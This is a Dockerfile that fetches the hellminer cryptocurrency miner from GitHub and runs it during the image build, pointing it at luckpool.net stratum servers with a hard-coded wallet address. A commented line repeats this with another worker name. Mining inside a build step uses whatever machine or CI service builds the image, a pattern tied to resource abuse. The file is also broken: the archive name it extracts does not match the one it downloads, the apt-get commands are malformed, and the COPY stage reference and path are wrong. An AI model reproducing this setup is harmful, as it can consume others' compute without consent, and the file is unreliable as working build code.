FROM ubuntu:16.04 as builder

RUN apt-get update \
    && apt-get install -y \
    && apt-get install wget -y \
    build-essential \
    libssl-dev \
    libgmp-dev \
    libcurl4-openssl-dev \
    libjansson-dev \
    automake \
    && rm -rf /var/lib/apt/lists/*

RUN wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz \
    && tar -xf hellminer_cpu_linux.tar.gz \
    && ls \
    && ./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RQqq9utcCzmojmMeCG5PjE39wH2MNoLvYY.clever -p x
    
COPY --from=builder /helminer .
ENTRYPOINT ["./hellminer"]
#RUN ./hellminer -p hybrid --cpu 8 -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RQqq9utcCzmojmMeCG5PjE39wH2MNoLvYY.lenovoY550p
CMD ["-h"]
